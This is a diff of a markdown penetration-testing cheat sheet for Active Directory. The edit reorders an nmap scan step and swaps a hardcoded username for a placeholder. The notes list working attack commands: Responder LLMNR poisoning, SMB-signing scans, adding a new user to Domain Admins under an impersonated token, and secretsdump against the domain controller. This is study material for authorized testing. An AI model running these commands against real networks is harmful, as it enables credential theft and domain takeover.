@@ -11,14 +11,14 @@
 
 ### Initial attack vectors
 
+Run `nmap` to find targets.
+- `nmap -sS -T4 [ip-address range]`
+
 Run `netdiscover` to find the IP-addresses available on the network.
 
 Try LLMNR Poisoning.
 - `sudo mousepad /etc/responder/Responder.conf` *(Make sure all options are on)*
 - `sudo responder -I eth0 -dPv` on vpn `sudo responder -I tun0 -dPv`
-
-Run `nmap` to find targets.
-- `nmap -sS -T4 [ip-address range]`
 
 Run `nmap` on the network to check if SMB-signing is enabled but not required.
 - `nmap --script=smb2-security-mode.nse -p445 xxx.xxx.xxx.0/24` *(Add -Pn for better probing)*
@@ -80,7 +80,7 @@ Token Impersonation.
 - When impersonating a DA
   - `shell`
   - `net user /add [user] [password] /domain`
-  - `net group "Domain Admins" hawkeye /ADD /DOMAIN`
+  - `net group "Domain Admins" [user]   /ADD /DOMAIN`
   - Can now `secretsdump` the DC with this user.
 
 LNK File.
